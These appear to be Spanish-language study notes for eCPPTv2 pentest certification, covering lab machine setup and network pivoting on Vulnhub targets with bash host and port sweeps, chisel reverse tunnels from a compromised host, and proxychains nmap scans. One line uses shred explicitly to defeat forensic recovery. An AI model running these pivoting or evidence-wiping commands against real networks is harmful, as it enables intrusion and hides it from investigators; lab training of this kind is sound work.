___
- tags: #pivoting #machine 
___
# Preparación eCCPTv2
## Diagrama
![[Preparación eCPPT.drawio.png]]

## Máquinas
- [Aragog - Vulnhub](https://www.vulnhub.com/entry/harrypotter-aragog-102,688/).
- [Nagini - Vulnhub](https://www.vulnhub.com/entry/harrypotter-nagini,689/).
- [Fawkes - Vulnhub](https://www.vulnhub.com/entry/harrypotter-fawkes,686/).
- [Matrix 1 - Vulnhub](https://www.vulnhub.com/entry/matrix-1,259/).
- [Brainpan - Vulnhub](https://www.vulnhub.com/entry/brainpan-1,51/).
- [Windows 7 x64](https://windows-7-home-premium.uptodown.com/windows/descargar).

## Configuración extra para interfaces de red
```shell
# Entrar en modo edición al inciar la máquina
e

# donde dice linux, de ro quiet -> rw init=/bin/bash

# nos vamos a la sgte ruta
cd /etc/network

# revisamos las interfaces 
ip a

# abrimos el archivo interfaces
nano interfaces

# modificamos la interfaz a ens33/ens34 según corresponda
```

### Antes
![[Pasted image 20251118230107.png]]
### Después
![[Pasted image 20251118230239.png]]

### Happy Hacking >x})

### Aragog

#### Horcrux
```txt
# horcrux 1
1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets

# horcrux 2
2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre

- [wp scan - Unauthenticated Submission File to RCE](https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9/).
```
#### Utilidad para buscar hosts dentro de la máquina
```bash
#!/bin/bash

for i in $(seq 1 254); do 
	timeout 1 bash -c "ping -c 1 10.10.0.$i" &>/dev/null && echo "[+] El host 10.10.0.$i - ACTIVE" &
done; wait
```
#### Alternativa a lo anterior
```bash
#!/bin/bash

for i in $(seq 1 254); do
	for port in 21 22 80 443 445 8080; do
		timeout 1 bash -c "ehco '' > /dev/tcp/10.10.0.$i/$port" &>/dev/null && echo "[+] Host 10.10.0.$i - PORT $port - ACTIVE" $
	done;
done; wait
```

#### Chisel
```shell
# Desde la máquina atacante
./chisel server --reverse -p 1234 # levanta un servidor desde el puerto 1234

# Desde la máquina pwned - modo cliente - mi ip
./chisel client 192.168.1.84:1234 R:80:10.10.0.129:80
# R:80 -> mi puerto
# :10.10.0.129:80 -> ip:puerto que quiero alcanzar


# Definimos un tunel tipo socks
./chisel client 192.168.1.84:1234 R:socks
# nos asigna automáticamente un puerto para forwarding

```
[chisel - github](https://github.com/jpillora/chisel).

### Nagini

#### Utilizando Nmap con proxy 
```shell
# como pensamos que sería
nmap --top-ports 500 --open -T5 -v -n 10.10.0.129

# escaneamos con indicando proxy ----> lento
proxychains nmap  -sT --top-ports 500 --open -T5 -v -n -Pn 10.10.0.129 2>/dev/null

# escaneamos de forma paralela los puertos para agilizar el escaneo
seq 1 65535 1 | xargs -P 500 -I {} proxychains nmap  -sT -p{} --open -T5 -v -n -Pn 10.10.0.129 | grep "tcp open" 
```

#### Conectando con http3
```shell
# desde la máquina aragog -> indicamos que aedmas del socks nos traeremos por udp el puerto 443
./chisel client 192.168.195.128:1234 R:socks R:443:10.10.0.129:443/udp
```

## Apuntes
```shell
# borrado para ofuscar la búsqueda con metodos forenses ...
shred -zun 10 -v
```
## Referencias
- [Video de S4vitar](https://www.youtube.com/watch?v=Q7UeWILja-g&t=7185s).
- [ - tool]().